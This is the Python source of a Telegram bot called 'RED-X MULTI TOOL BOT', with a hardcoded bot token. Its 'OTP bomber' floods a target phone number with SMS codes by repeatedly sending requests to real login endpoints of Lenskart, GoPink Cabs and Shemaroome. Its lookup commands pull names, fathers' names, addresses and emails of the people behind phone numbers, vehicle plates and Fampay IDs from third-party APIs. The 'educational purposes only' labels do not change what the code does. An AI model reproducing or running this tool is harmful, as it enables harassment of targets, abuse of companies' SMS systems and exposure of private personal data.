import os
import sys
import logging
import re
import asyncio
import aiohttp
import sqlite3
import base64
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# ===================== TOKEN =====================
TOKEN = "8524636877:AAHz73Z2SdjUoTotM9W-NkYn_1v1nRUvIUE"

# ===================== API URLs =====================
VEHICLE_API = "https://anupvehicleinfo07.vercel.app/lookup"
PHONE_API = "https://source-code-api.vercel.app/"
IP_API = "http://ip-api.com/json/"
BIN_API = "https://lookup.binlist.net/"
FAMPAY_API = "https://fampay-2-number.vercel.app/get-number"
NUMBER_TO_OWNER_API = "https://number-to-owner.vercel.app/info"

# ===================== BOMBER APIs =====================
OTP_APIS = [
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    }
]

# ===================== SETUP =====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database
def init_db():
    conn = sqlite3.connect('info.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                (user_id INTEGER PRIMARY KEY, 
                 username TEXT,
                 first_name TEXT,
                 join_date TEXT)''')
    conn.commit()
    conn.close()
    print("✅ Database ready!")

# ===================== API FUNCTIONS =====================
async def get_vehicle(rc: str):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{VEHICLE_API}?rc={rc}"
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
    except:
        return None

async def get_phone(phone: str):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{PHONE_API}?num={phone}"
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
    except:
        return None

async def get_ip(ip: str):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{IP_API}{ip}"
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
    except:
        return None

async def get_bin(bin_num: str):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{BIN_API}{bin_num}"
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
    except:
        return None

async def get_fampay_info(fam_id: str):
    """Get info from fampay API"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{FAMPAY_API}?id={fam_id}"
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
    except:
        return None

async def get_number_owner_info(phone: str):
    """Get owner info from number"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{NUMBER_TO_OWNER_API}?name={phone}"
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
    except:
        return None

# ===================== BOMBER FUNCTION =====================
async def bomber_attack(phone: str, count: int = 5):
    total = 0
    success = 0
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            for api in OTP_APIS:
                try:
                    headers = api["headers"].copy()
                    data = api["data"](phone) if api["data"] else None
                    
                    if api["method"] == "POST":
                        async with session.post(api["url"], headers=headers, data=data, timeout=3) as resp:
                            total += 1
                            if resp.status == 200:
                                success += 1
                    else:
                        async with session.get(api["url"], headers=headers, timeout=3) as resp:
                            total += 1
                            if resp.status == 200:
                                success += 1
                except:
                    total += 1
            
            await asyncio.sleep(0.5)
    
    return {"total": total, "success": success, "failed": total - success}

# ===================== BOT HANDLERS =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Save to DB
    try:
        conn = sqlite3.connect('info.db')
        c = conn.cursor()
        c.execute('''INSERT OR IGNORE INTO users 
                     (user_id, username, first_name, join_date) 
                     VALUES (?, ?, ?, ?)''',
                  (user.id, user.username, user.first_name, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except:
        pass
    
    # Menu keyboard
    keyboard = [
        ['🚗 Vehicle Lookup', '📱 Phone Lookup'],
        ['💣 OTP Bomber', '🌍 IP Tracker'],
        ['💳 BIN Checker', '📞 Fampay Info'],
        ['👤 Number Owner', '🔐 Password Check'],
        ['🔒 Encrypt', '📊 Stats', 'ℹ️ Help']
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    # Simple text without markdown errors
    welcome_text = """🔥 RED-X MULTI TOOL BOT 🔥

👨💻 Developer: @REDX_64

✨ Features:
• Vehicle RC Lookup
• Phone Number Info
• OTP Bomber (Educational)
• IP Address Tracker
• BIN Checker
• Fampay ID Lookup
• Number to Owner
• Password Checker
• Encryption
• User Statistics

⚠️ For educational purposes only!

Select an option below 👇"""
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """🤖 RED-X BOT HELP

🔹 Commands:
/start - Start bot
/help - This message
/vehicle <rc> - Vehicle info
/phone <num> - Phone info
/bomber <num> <count> - OTP bomber
/ip <address> - IP tracker
/bin <num> - BIN checker
/fampay <id> - Fampay info
/owner <num> - Number owner info
/password <pass> - Check password
/encrypt <text> - Encrypt text
/decrypt <text> - Decrypt text
/stats - Your stats

👨💻 Developer: @REDX_64"""
    
    await update.message.reply_text(help_text)

async def vehicle_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send RC number: /vehicle UP26R4007")
        return
    
    rc = context.args[0].upper()
    msg = await update.message.reply_text('🔍 Searching vehicle...')
    
    data = await get_vehicle(rc)
    
    if data and 'Ownership Details' in data:
        owner = data['Ownership Details']
        vehicle = data.get('Vehicle Details', {})
        
        response = f"""🚗 VEHICLE FOUND

• RC: {rc}
• Owner: {owner.get('Owner Name', 'N/A')}
• Father: {owner.get('Father Name', 'N/A')}
• RTO: {owner.get('Registered RTO', 'N/A')}
• Model: {vehicle.get('Model Name', 'N/A')}
• Fuel: {vehicle.get('Fuel Type', 'N/A')}

👨💻 Developer: @REDX_64"""
    else:
        response = f"""❌ Vehicle not found!

RC: {rc}

👨💻 Developer: @REDX_64"""
    
    await msg.edit_text(response)

async def phone_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send phone: /phone 9876543210")
        return
    
    phone = context.args[0]
    msg = await update.message.reply_text('🔍 Searching phone...')
    
    data = await get_phone(phone)
    
    if data and isinstance(data, list) and len(data) > 0:
        record = data[0]
        response = f"""📱 PHONE INFO

• Number: {phone}
• Name: {record.get('name', 'N/A')}
• Father: {record.get('father_name', 'N/A')}
• Address: {record.get('address', 'N/A')[:50]}...
• Email: {record.get('email', 'N/A')}

Found {len(data)} records

👨💻 Developer: @REDX_64"""
    else:
        response = f"""❌ Phone not found!

Number: {phone}

👨💻 Developer: @REDX_64"""
    
    await msg.edit_text(response)

async def bomber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Send: /bomber 9876543210 5")
        return
    
    phone = context.args[0]
    try:
        count = int(context.args[1])
    except:
        count = 5
    
    if count > 10:
        count = 10
    
    msg = await update.message.reply_text(f'💣 Starting bomber...\n\nTarget: +91{phone}\nWaves: {count}')
    
    result = await bomber_attack(phone, count)
    
    success_rate = (result['success'] / result['total'] * 100) if result['total'] > 0 else 0
    
    await msg.edit_text(
        f"""🎯 BOMBER COMPLETE

📱 Target: +91{phone}
💣 Waves: {count}
📤 Total: {result['total']}
✅ Success: {result['success']}
❌ Failed: {result['failed']}
📊 Rate: {success_rate:.1f}%

⚠️ Educational purpose only!

👨💻 Developer: @REDX_64"""
    )

async def ip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send: /ip 8.8.8.8")
        return
    
    ip = context.args[0]
    msg = await update.message.reply_text('🌍 Tracking IP...')
    
    data = await get_ip(ip)
    
    if data and data.get('status') == 'success':
        response = f"""🌍 IP INFO

• IP: {data.get('query', 'N/A')}
• Country: {data.get('country', 'N/A')}
• City: {data.get('city', 'N/A')}
• ISP: {data.get('isp', 'N/A')}
• Timezone: {data.get('timezone', 'N/A')}

👨💻 Developer: @REDX_64"""
    else:
        response = f"""❌ Invalid IP!

IP: {ip}

👨💻 Developer: @REDX_64"""
    
    await msg.edit_text(response)

async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send: /bin 411111")
        return
    
    bin_num = context.args[0][:6]
    msg = await update.message.reply_text('💳 Checking BIN...')
    
    data = await get_bin(bin_num)
    
    if data:
        response = f"""💳 BIN INFO

• BIN: {bin_num}
• Scheme: {data.get('scheme', 'N/A')}
• Type: {data.get('type', 'N/A')}
• Brand: {data.get('brand', 'N/A')}
• Country: {data.get('country', {}).get('name', 'N/A')}

👨💻 Developer: @REDX_64"""
    else:
        response = f"""❌ BIN not found!

BIN: {bin_num}

👨💻 Developer: @REDX_64"""
    
    await msg.edit_text(response)

async def fampay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """New command for Fampay API"""
    if not context.args:
        await update.message.reply_text("Send Fampay ID: /fampay loverajoriya@fam")
        return
    
    fam_id = context.args[0]
    msg = await update.message.reply_text('🔍 Searching Fampay info...')
    
    data = await get_fampay_info(fam_id)
    
    if data and data.get('status') == True:
        response = f"""📞 FAMPAY INFO FOUND

• ID: {data.get('fam_id', 'N/A')}
• Name: {data.get('name', 'N/A')}
• Phone: {data.get('phone', 'N/A')}
• Source: {data.get('source', 'N/A')}
• Type: {data.get('type', 'N/A')}
• Status: {'✅ Active' if data.get('status') else '❌ Inactive'}

👨💻 Developer: @REDX_64"""
    else:
        response = f"""❌ Fampay info not found!

ID: {fam_id}

👨💻 Developer: @REDX_64"""
    
    await msg.edit_text(response)

async def owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """New command for Number to Owner API"""
    if not context.args:
        await update.message.reply_text("Send phone number: /owner 917563983380")
        return
    
    phone = context.args[0]
    # Remove +91 if present
    if phone.startswith('+91'):
        phone = phone[3:]
    elif phone.startswith('91'):
        phone = phone[2:]
    
    msg = await update.message.reply_text('🔍 Searching owner info...')
    
    data = await get_number_owner_info(phone)
    
    if data and isinstance(data, dict) and data:
        response = f"""👤 NUMBER OWNER INFO

• Number: {phone}
• Name: {data.get('name', 'N/A')}
• Address: {data.get('address', 'N/A')}
• Email: {data.get('email', 'N/A')}
• Additional Info: {data.get('info', 'N/A')}

👨💻 Developer: @REDX_64"""
    else:
        response = f"""❌ Owner info not found!

Number: {phone}

👨💻 Developer: @REDX_64"""
    
    await msg.edit_text(response)

async def password_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send: /password MyPass123!")
        return
    
    pwd = " ".join(context.args)
    
    score = 0
    if len(pwd) >= 8: score += 1
    if re.search(r'[A-Z]', pwd): score += 1
    if re.search(r'[a-z]', pwd): score += 1
    if re.search(r'\d', pwd): score += 1
    if re.search(r'[!@#$%^&*(),.?":{}|<>]', pwd): score += 1
    
    if score >= 4: strength = "🔒 Very Strong"
    elif score == 3: strength = "🟢 Strong"
    elif score == 2: strength = "🟡 Medium"
    else: strength = "🔴 Weak"
    
    await update.message.reply_text(
        f"""🔐 PASSWORD CHECK

Password: {'*' * len(pwd)}
Length: {len(pwd)}
Strength: {strength}

👨💻 Developer: @REDX_64"""
    )

async def encrypt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send: /encrypt Hello")
        return
    
    text = " ".join(context.args)
    encrypted = base64.b64encode(text.encode()).decode()
    
    await update.message.reply_text(
        f"""🔒 ENCRYPTED

Original: {text}
Encrypted: {encrypted}

👨💻 Developer: @REDX_64"""
    )

async def decrypt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Send: /decrypt SGVsbG8=")
        return
    
    text = " ".join(context.args)
    try:
        decrypted = base64.b64decode(text).decode()
        await update.message.reply_text(
            f"""🔓 DECRYPTED

Encrypted: {text}
Decrypted: {decrypted}

👨💻 Developer: @REDX_64"""
        )
    except:
        await update.message.reply_text("❌ Invalid encrypted text!")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    try:
        conn = sqlite3.connect('info.db')
        c = conn.cursor()
        
        c.execute("SELECT join_date FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        
        conn.close()
        
        if user:
            join_date = user[0]
            
            await update.message.reply_text(
                f"""📊 YOUR STATS

👤 User ID: {user_id}
📅 Joined: {join_date}

👨💻 Developer: @REDX_64"""
            )
        else:
            await update.message.reply_text(
                """📊 No stats found!

👨💻 Developer: @REDX_64"""
            )
    except:
        await update.message.reply_text(
            """📊 Error getting stats!

👨💻 Developer: @REDX_64"""
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == '🚗 Vehicle Lookup':
        await update.message.reply_text("Send RC number:\nExample: /vehicle UP26R4007")
    elif text == '📱 Phone Lookup':
        await update.message.reply_text("Send phone number:\nExample: /phone 9876543210")
    elif text == '💣 OTP Bomber':
        await update.message.reply_text("Send: /bomber 9876543210 5\n\n⚠️ Educational purpose only!")
    elif text == '🌍 IP Tracker':
        await update.message.reply_text("Send: /ip 8.8.8.8")
    elif text == '💳 BIN Checker':
        await update.message.reply_text("Send: /bin 411111")
    elif text == '📞 Fampay Info':
        await update.message.reply_text("Send: /fampay loverajoriya@fam")
    elif text == '👤 Number Owner':
        await update.message.reply_text("Send: /owner 917563983380")
    elif text == '🔐 Password Check':
        await update.message.reply_text("Send: /password MyPass123!")
    elif text == '🔒 Encrypt':
        await update.message.reply_text("Send: /encrypt Hello World")
    elif text == '📊 Stats':
        await stats_cmd(update, context)
    elif text == 'ℹ️ Help':
        await help_cmd(update, context)
    else:
        # Auto-detect
        if re.match(r'^[A-Z]{2}\d{1,2}[A-Z]{1,2}\d{1,4}$', text.upper()):
            await vehicle_cmd(update, context)
        elif re.match(r'^\d{10}$', text):
            await phone_cmd(update, context)
        elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', text):
            await ip_cmd(update, context)
        elif re.match(r'^\d{6}$', text):
            await bin_cmd(update, context)
        elif '@fam' in text.lower():
            await fampay_cmd(update, context)
        elif re.match(r'^(\+91|91)?\d{10}$', text):
            await owner_cmd(update, context)
        else:
            await update.message.reply_text(
                "Use menu buttons or commands!\nTry /help for commands list."
            )

# ===================== MAIN =====================
def main():
    print("""
🔥 RED-X MULTI TOOL BOT 🔥
👨💻 Developer: @REDX_64
📅 Starting...
    """)
    
    # Initialize
    init_db()
    
    # Create app
    try:
        app = Application.builder().token(TOKEN).build()
        print("✅ Bot application created!")
    except Exception as e:
        print(f"❌ Error: {e}")
        print("❌ Invalid token! Get new from @BotFather")
        return
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("vehicle", vehicle_cmd))
    app.add_handler(CommandHandler("phone", phone_cmd))
    app.add_handler(CommandHandler("bomber", bomber_cmd))
    app.add_handler(CommandHandler("ip", ip_cmd))
    app.add_handler(CommandHandler("bin", bin_cmd))
    app.add_handler(CommandHandler("fampay", fampay_cmd))
    app.add_handler(CommandHandler("owner", owner_cmd))
    app.add_handler(CommandHandler("password", password_cmd))
    app.add_handler(CommandHandler("encrypt", encrypt_cmd))
    app.add_handler(CommandHandler("decrypt", decrypt_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start bot
    print("✅ Bot starting...")
    app.run_polling()

if __name__ == '__main__':
    main()